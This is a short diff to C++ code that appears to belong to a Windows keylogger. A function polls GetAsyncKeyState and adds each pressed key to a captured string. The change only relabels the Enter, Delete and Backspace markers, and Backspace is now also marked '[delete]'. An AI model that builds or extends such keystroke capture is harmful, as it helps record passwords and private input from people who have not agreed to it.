@@ -154,8 +154,8 @@ void teclasPrecionadas(string& teclas, int tempoSleep) {
         Sleep(tempoSleep);
     }
     if (GetAsyncKeyState(0x0d)) {
-        cout << "/n";
-        teclas += "<br>";
+        cout << " [enter] ";
+        teclas += " [enter] ";
         Sleep(tempoSleep);
     }
     if (GetAsyncKeyState(0x30)) {
@@ -209,13 +209,13 @@ void teclasPrecionadas(string& teclas, int tempoSleep) {
         Sleep(tempoSleep);
     }
     if (GetAsyncKeyState(VK_DELETE)) {
-        cout << "\\del*";
-        teclas += "\\del*";
+        cout << " [delete] ";
+        teclas += "[delete]";
         Sleep(tempoSleep);
     }
     if (GetAsyncKeyState(VK_BACK)) {
-        cout << "\\back*";
-        teclas += "\\back*";
+        cout << " [delete] ";
+        teclas += " [delete] ";
         Sleep(tempoSleep);
     }
     if (noKeysPressed) {
